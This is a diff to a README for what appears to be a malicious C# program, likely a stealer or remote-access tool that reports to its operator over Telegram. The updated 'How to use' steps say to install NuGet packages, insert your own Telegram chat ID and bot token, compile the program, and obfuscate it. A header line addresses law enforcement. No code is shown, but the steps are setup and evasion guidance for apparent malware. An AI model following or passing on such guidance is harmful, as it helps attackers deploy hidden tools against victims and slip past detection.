@@ -15,10 +15,11 @@ IF YOU ARE LAW ENFOCEMENT PLEASE CONTACT US BY ISSUES ANY SPAM OR FAKES WILL BE 
 
 ## How to use
 1. Download VS 2022 or 2019 [RECOMMENDED 2019]
-2. Edit Program and Replace CHATID with your telegram ID
-3. Go to Webhook.cs
-4. Replace string TelegramToken = "Telegram Token"; Put your telegram token here
-5. Compile and Done
+2. Install Missing packages using nuget
+3. Edit Program and Replace CHATID with your telegram ID
+4. Go to Webhook.cs
+5. Replace string TelegramToken = "Telegram Token"; Put your telegram token here
+6. Compile and Done
 OBFUSCATION IS RECOMMENDED!
 
 ## Pictures:
